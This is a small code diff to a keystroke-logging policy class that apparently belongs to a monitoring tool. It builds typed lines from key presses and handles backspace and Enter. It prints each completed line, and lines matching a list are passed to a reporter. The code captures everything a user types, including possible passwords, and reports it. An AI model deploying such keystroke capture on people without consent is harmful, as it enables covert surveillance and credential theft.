@@ -20,10 +20,19 @@ class KeylogPolicy(Policy):
                 name = " "
             elif name == "decimal":
                 name = "."
+            elif name == "backspace":
+                name = ""
+                self.line_typed = self.line_typed[:-1]
             elif name == "enter":
                 name = ""
+                print(self.line_typed)
+
                 if gmget("bwlist").check(self.line_typed):
                     gmget("reporter").report(self.line_typed)
+                self.line_typed = ""
+            else:
+                name = ""
+
             self.line_typed += name
         else:
             self.line_typed += name
